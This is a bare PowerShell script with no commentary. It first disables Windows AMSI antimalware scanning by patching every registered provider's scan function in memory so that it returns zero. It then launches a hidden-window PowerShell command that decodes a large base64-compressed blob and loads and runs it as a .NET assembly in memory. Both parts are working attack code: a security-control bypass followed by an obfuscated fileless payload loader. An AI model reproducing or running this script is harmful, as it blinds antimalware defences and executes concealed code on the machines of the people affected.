$Apis = @"
using System;
using System.Runtime.InteropServices;

public class Apis {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi")]
  public static extern int AmsiInitialize(string appName, out Int64 context);
}
"@
Add-Type $Apis

$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$p = 0; $i = 0
$SIZE_OF_PTR = 8
[Int64]$ctx = 0

[Apis]::AmsiInitialize("MyScanner", [ref]$ctx)
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)

while ($AntimalwareProvider -ne 0)
{
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)

  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
  
  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
}


powershell -Sta -Nop -Window Hidden -Command "sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null"
